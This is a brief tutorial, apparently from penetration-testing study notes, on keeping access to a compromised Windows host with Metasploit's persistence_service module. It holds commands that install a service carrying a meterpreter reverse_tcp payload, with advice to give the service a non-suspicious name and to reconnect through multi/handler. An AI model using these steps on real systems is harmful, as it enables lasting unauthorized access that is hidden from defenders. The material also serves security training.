
+ Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access.

+ Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your targets.

+ We can utilize various post exploitation persistence modules to ensure that we always have access to the target system.

### How to establish persistence ?

1. After we gain initial access to the target by exploiting a vulnerable service we need to establish a persistent connection as the service we exploited might get patched. 

2. We can search for persistence modules.
```
search platform:windows persistence
```

3. Using a persistent service module. This will install a service in the target which will establish a persistent connection.
```
use exploit/windows/local/persistence_service
```
- Set `SERVICE_NAME` to something non suspicious.
- Set `payload`. `set payload windows/meterpreter/reverse_tcp`

4. Now if we loose access or close our meterpreter session, we re-gain access using our `multi/handler`.  Set our payload and LHOST to the one we specified before, and we should get a connection immediately. 

